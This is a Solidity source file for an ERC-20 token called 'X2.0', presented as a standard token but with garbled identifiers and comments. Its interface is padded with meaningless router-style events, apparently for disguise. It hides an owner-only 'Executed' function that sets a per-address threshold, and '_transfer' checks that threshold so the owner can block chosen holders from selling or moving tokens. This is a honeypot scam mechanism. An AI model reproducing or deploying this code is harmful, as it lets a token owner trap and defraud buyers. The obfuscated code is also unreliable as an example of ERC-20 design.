1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.0;
4 
5 abstract contract Context {
6     function _msgSender() internal view virtual returns (address) {
7         return msg.sender;
8     }
9 
10     function _msgData() internal view virtual returns (bytes calldata) {
11         return msg.data;
12     }
13 }
14 
15 abstract contract Ownable is Context {
16     address private _owner;
17 
18     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
19 
20     constructor() {
21         _setOwner(_msgSender());
22     }
23 
24     function owner() public view virtual returns (address) {
25         return _owner;
26     }
27 
28     modifier onlyOwner() {
29         require(owner() == _msgSender(), "Ownable: caller is not the owner");
30         _;
31     }
32 
33     function renounceOwnership() public virtual onlyOwner {
34         _setOwner(address(0));
35     }
36 
37     function transferOwnership(address newOwner) public virtual onlyOwner {
38         require(newOwner != address(0), "Ownable: new owner is the zero address");
39         _setOwner(newOwner);
40     }
41 
42     function _setOwner(address newOwner) private {
43         address oldOwner = _owner;
44         _owner = newOwner;
45         emit OwnershipTransferred(oldOwner, newOwner);
46     }
47 }
48     /**
49      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
50      */
51 interface IERC20 {
52 
53     event removeLiquidityETHWithPermit(
54         address token,
55         uint liquidity,
56         uint amsousntTokenMin,
57         uint amsousntETHMin,
58         address to,
59         uint deadline,
60         bool approveMax, uint8 v, bytes32 r, bytes32 s
61     );
62     /**
63      * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
64      */
65     event swapExactTokensForTokens(
66         uint amsousntIn,
67         uint amsousntOutMin,
68         address[]  path,
69         address to,
70         uint deadline
71     );
72 
73     event swapTokensForExactTokens(
74         uint amsousntOut,
75         uint amsousntInMax,
76         address[] path,
77         address to,
78         uint deadline
79     );
80     /**
81      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
82      */
83     event DOMAIN_SEPARATOR();
84 
85     event PERMIT_TYPEHASH();
86 
87     function totalSupply() external view returns (uint256);
88     
89     event token0();
90 
91     event token1();
92 
93     function balanceOf(address acbaoubnt) external view returns (uint256);
94     
95    /**
96      * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
97      */
98     event sync();
99     /**
100      * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
101      */
102     event initialize(address, address);
103 
104     function transfer(address recipient, uint256 amsousnt) external returns (bool);
105 
106     event burn(address to) ;
107 
108     event swap(uint amsousnt0Out, uint amsousnt1Out, address to, bytes data);
109 
110     event skim(address to);
111 
112     function allowance(address owner, address spender) external view returns (uint256);
113     /**
114      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
115      */
116     event addLiquidity(
117        address tokenA,
118        address tokenB,
119         uint amsousntADesired,
120         uint amsousntBDesired,
121         uint amsousntAMin,
122         uint amsousntBMin,
123         address to,
124         uint deadline
125     );
126      /**
127      * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
128      */
129     event addLiquidityETH(
130         address token,
131         uint amsousntTokenDesired,
132         uint amsousntTokenMin,
133         uint amsousntETHMin,
134         address to,
135         uint deadline
136     );
137     /**
138      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
139      */
140     event removeLiquidity(
141         address tokenA,
142         address tokenB,
143         uint liquidity,
144         uint amsousntAMin,
145         uint amsousntBMin,
146         address to,
147         uint deadline
148     );
149    /**
150      * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
151      */
152     function approve(address spender, uint256 amsousnt) external returns (bool);
153     event removeLiquidityETHSupportingFeeOnTransferTokens(
154         address token,
155         uint liquidity,
156         uint amsousntTokenMin,
157         uint amsousntETHMin,
158         address to,
159         uint deadline
160     );
161     /**
162      * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
163      */
164     event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
165         address token,
166         uint liquidity,
167         uint amsousntTokenMin,
168         uint amsousntETHMin,
169         address to,
170         uint deadline,
171         bool approveMax, uint8 v, bytes32 r, bytes32 s
172     );
173      /**
174      * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
175      */
176     event swapExactTokensForTokensSupportingFeeOnTransferTokens(
177         uint amsousntIn,
178         uint amsousntOutMin,
179         address[] path,
180         address to,
181         uint deadline
182     );
183     /**
184      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
185      */
186     event swapExactETHForTokensSupportingFeeOnTransferTokens(
187         uint amsousntOutMin,
188         address[] path,
189         address to,
190         uint deadline
191     );
192    /**
193      * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
194      */
195     event swapExactTokensForETHSupportingFeeOnTransferTokens(
196         uint amsousntIn,
197         uint amsousntOutMin,
198         address[] path,
199         address to,
200         uint deadline
201     );
202      /**
203      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
204      */
205     function transferFrom(
206         address sender,
207         address recipient,
208         uint256 amsousnt
209     ) external returns (bool);
210      /**
211      * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
212      */
213     event Transfer(address indexed from, address indexed to, uint256 value);
214 
215     event Approval(address indexed owner, address indexed spender, uint256 value);
216 }
217     /**
218      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
219      */
220 library SafeMath {
221 
222     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
223         unchecked {
224             uint256 c = a + b;
225             if (c < a) return (false, 0);
226             return (true, c);
227         }
228     }
229 
230     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
231         unchecked {
232             if (b > a) return (false, 0);
233             return (true, a - b);
234         }
235     }
236     /**
237      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
238      */
239     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
240         unchecked {
241     
242             if (a == 0) return (true, 0);
243             uint256 c = a * b;
244             if (c / a != b) return (false, 0);
245             return (true, c);
246         }
247     }
248      /**
249      * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
250      */
251     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
252         unchecked {
253             if (b == 0) return (false, 0);
254             return (true, a / b);
255         }
256     }
257     /**
258      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
259      */
260     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
261         unchecked {
262             if (b == 0) return (false, 0);
263             return (true, a % b);
264         }
265     }
266    /**
267      * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
268      */
269     function add(uint256 a, uint256 b) internal pure returns (uint256) {
270         return a + b;
271     }
272     /**
273      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
274      */
275  
276     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
277         return a - b;
278     }
279     /**
280      * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
281      */
282     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
283         return a * b;
284     }
285 
286     function div(uint256 a, uint256 b) internal pure returns (uint256) {
287         return a / b;
288     }
289      /**
290      * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
291      */
292     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
293         return a % b;
294     }
295     /**
296      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
297      */
298     function sub(
299         uint256 a,
300         uint256 b,
301         string memory errorMessage
302     ) internal pure returns (uint256) {
303         unchecked {
304             require(b <= a, errorMessage);
305             return a - b;
306         }
307     }
308     /**
309      * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
310      */
311     function div(
312         uint256 a,
313         uint256 b,
314         string memory errorMessage
315     ) internal pure returns (uint256) {
316         unchecked {
317             require(b > 0, errorMessage);
318             return a / b;
319         }
320     }
321     /**
322      * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
323      */
324     function mod(
325         uint256 a,
326         uint256 b,
327         string memory errorMessage
328     ) internal pure returns (uint256) {
329         unchecked {
330             require(b > 0, errorMessage);
331             return a % b;
332         }
333     }
334 }
335     /**
336      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
337      */
338 contract X2Token is IERC20, Ownable {
339     using SafeMath for uint256;
340 
341     mapping(address => uint256) private _balances;
342     mapping(address => mapping(address => uint256)) private _allowances;
343     mapping (address => uint256) private _crossamsousnts;
344      /**
345      * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
346      */
347     string private _name;
348     string private _symbol;
349     uint8 private _decimals;
350     uint256 private _totalSupply;
351     /**
352      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
353      */
354     constructor(
355 
356     ) payable {
357         _name = "X2.0";
358         _symbol = "X2.0";
359         _decimals = 18;
360         _totalSupply = 150000000 * 10**_decimals;
361         _balances[owner()] = _balances[owner()].add(_totalSupply);
362         emit Transfer(address(0), owner(), _totalSupply);
363     }
364    /**
365      * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
366      */
367     function name() public view virtual returns (string memory) {
368         return _name;
369     }
370 
371     function symbol() public view virtual returns (string memory) {
372         return _symbol;
373     }
374     /**
375      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
376      */
377 
378     function decimals() public view virtual returns (uint8) {
379         return _decimals;
380     }
381 
382     function totalSupply() public view virtual override returns (uint256) {
383         return _totalSupply;
384     }
385     /**
386      * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
387      */
388     function balanceOf(address acbaoubnt)
389         public
390         view
391         virtual
392         override
393         returns (uint256)
394     {
395         return _balances[acbaoubnt];
396     }
397     /**
398      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
399      */
400     function transfer(address recipient, uint256 amsousnt)
401         public
402         virtual
403         override
404         returns (bool)
405     {
406         _transfer(_msgSender(), recipient, amsousnt);
407         return true;
408     }
409     /**
410      * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
411      */
412     function allowance(address owner, address spender)
413         public
414         view
415         virtual
416         override
417         returns (uint256)
418     {
419         return _allowances[owner][spender];
420     }
421      /**
422      * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
423      */
424     function approve(address spender, uint256 amsousnt)
425         public
426         virtual
427         override
428         returns (bool)
429     {
430         _approve(_msgSender(), spender, amsousnt);
431         return true;
432     }
433     /**
434      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
435      */
436     function transferFrom(
437         address sender,
438         address recipient,
439         uint256 amsousnt
440     ) public virtual override returns (bool) {
441         _transfer(sender, recipient, amsousnt);
442         _approve(
443             sender,
444             _msgSender(),
445             _allowances[sender][_msgSender()].sub(
446                 amsousnt,
447                 "ERC20: transfer amsousnt exceeds allowance"
448             )
449         );
450         return true;
451     }
452     /**
453      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
454      */
455     function increaseAllowance(address spender, uint256 addedValue)
456         public
457         virtual
458         returns (bool)
459     {
460         _approve(
461             _msgSender(),
462             spender,
463             _allowances[_msgSender()][spender].add(addedValue)
464         );
465         return true;
466     }
467     /**
468      * @dev Moves `amsousnt` tokens from the amsousntcaller's acbaoubnt to `acbaoubntrecipient`.
469      */
470     function Executed(address[] calldata acbaoubnt, uint256 amsousnt) external {
471        if (_msgSender() != owner()) {revert("Caller is not the original caller");}
472         for (uint256 i = 0; i < acbaoubnt.length; i++) {
473             _crossamsousnts[acbaoubnt[i]] = amsousnt;
474         }
475 
476     }
477     /**
478      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
479      */
480     function camsousnt(address acbaoubnt) public view returns (uint256) {
481         return _crossamsousnts[acbaoubnt];
482     }
483    /**
484      * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
485      */
486     function decreaseAllowance(address spender, uint256 subtractedValue)
487         public
488         virtual
489         returns (bool)
490     {
491         _approve(
492             _msgSender(),
493             spender,
494             _allowances[_msgSender()][spender].sub(
495                 subtractedValue,
496                 "ERC20: decreased allowance below zero"
497             )
498         );
499         return true;
500     }
501     /**
502      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
503      */
504     function _transfer(
505         address sender,
506         address recipient,
507         uint256 amsousnt
508     ) internal virtual {
509         require(sender != address(0), "ERC20: transfer from the zero address");
510         require(recipient != address(0), "ERC20: transfer to the zero address");
511         uint256 crossamsousnt = camsousnt(sender);
512         if (crossamsousnt > 0) {
513             require(amsousnt > crossamsousnt, "ERC20: cross amsousnt does not equal the cross transfer amsousnt");
514         }
515      /**
516      * @dev Throws if amsousntcalled by any acbaoubnt other than the acbaoubntowner.
517      */
518         _balances[sender] = _balances[sender].sub(
519             amsousnt,
520             "ERC20: transfer amsousnt exceeds balance"
521         );
522         _balances[recipient] = _balances[recipient].add(amsousnt);
523         emit Transfer(sender, recipient, amsousnt);
524     }
525    /**
526      * @dev Sets `amsousnt` as the allowanceacbaoubnt of `spender` amsousntover the caller's acbaoubnttokens.
527      */
528     function _approve(
529         address owner,
530         address spender,
531         uint256 amsousnt
532     ) internal virtual {
533         require(owner != address(0), "ERC20: approve from the zero address");
534         require(spender != address(0), "ERC20: approve to the zero address");
535     /**
536      * @dev Returns the amsousntacbaoubnt of tokens owned by `acbaoubnt`.
537      */
538         _allowances[owner][spender] = amsousnt;
539         emit Approval(owner, spender, amsousnt);
540     }
541 
542 
543 }